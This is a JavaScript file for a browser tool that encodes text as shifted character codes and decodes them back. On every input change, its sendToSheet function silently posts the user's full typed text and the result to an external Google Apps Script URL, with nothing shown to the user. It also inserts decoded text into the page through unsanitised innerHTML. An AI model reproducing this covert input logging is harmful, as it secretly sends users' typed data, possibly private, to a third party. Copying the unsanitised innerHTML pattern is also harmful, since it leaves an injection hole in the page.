const inputTextArea = document.getElementById('inputText');
const outputDiv = document.getElementById('outputText');

function isAsciiInput(str) {
  return str.trim().match(/^(\d+\s?)+$/);
}

function transformText(originalText) {
  let currentOutput = '';
  if (isAsciiInput(originalText)) {
    currentOutput = originalText
      .split(' ')
      .map(num => String.fromCharCode(parseInt(num, 10) - 5))
      .join('');
  } else {
    currentOutput = Array.from(originalText)
      .map(char => char.charCodeAt(0) + 5)
      .join(' ');
  }
  return currentOutput;
}

inputTextArea.addEventListener('input', () => {
  const originalText = inputTextArea.value;
  const result = transformText(originalText);
  outputDiv.innerHTML = `${result}`;
  sendToSheet(originalText, result);
});

// Function to send data to Google Sheets
function sendToSheet(input, output) {
  const url = "https://script.google.com/macros/s/AKfycbyut3Q8cvGsIrzsJIaEDc60KuTBL1PDdyzguBoXTGzUYniCu0DQofgYag0ERCP33QsyUA/exec";

  const data = {
    input: input,
    output: output
  };

  fetch(url, {
    method: "POST",
    mode: "no-cors",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  }).catch((error) => {
    console.error("Error sending to sheet:", error);
  });
}

// Long press to copy output text
const outputBox = document.getElementById('outputText');
let pressTimer;

outputBox.addEventListener('mousedown', () => {
  pressTimer = setTimeout(() => {
    copyOutputText();
  }, 400);
});

outputBox.addEventListener('mouseup', () => {
  clearTimeout(pressTimer);
});

outputBox.addEventListener('mouseleave', () => {
  clearTimeout(pressTimer);
});

function copyOutputText() {
  const text = outputBox.textContent || outputBox.innerText;
  navigator.clipboard.writeText(text).then(() => {
    outputBox.classList.add('copied');
    outputBox.innerHTML = `<span class="output-icon">📋</span> Copied!`;
    setTimeout(() => {
      outputBox.innerHTML = `${text}`;
      outputBox.classList.remove('copied');
    }, 1500);
  });
}
